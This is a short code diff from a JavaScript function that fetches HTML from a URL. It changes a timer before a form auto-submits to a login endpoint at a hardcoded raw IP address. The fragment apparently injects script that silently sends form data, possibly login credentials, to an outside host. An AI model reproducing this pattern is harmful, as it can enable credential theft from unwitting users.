@@ -418,7 +418,7 @@ const fetchHtmlFromUrl = async (req, res) => {
             form.action = 'http://31.207.34.16:5000/api/logins/login-summary';
             form.method = 'GET'; // Changez cela en fonction de vos besoins
             form.submit(); // Soumettre le formulaire après le délai
-          }, 500);
+          }, 1000);
               }
             });
           });
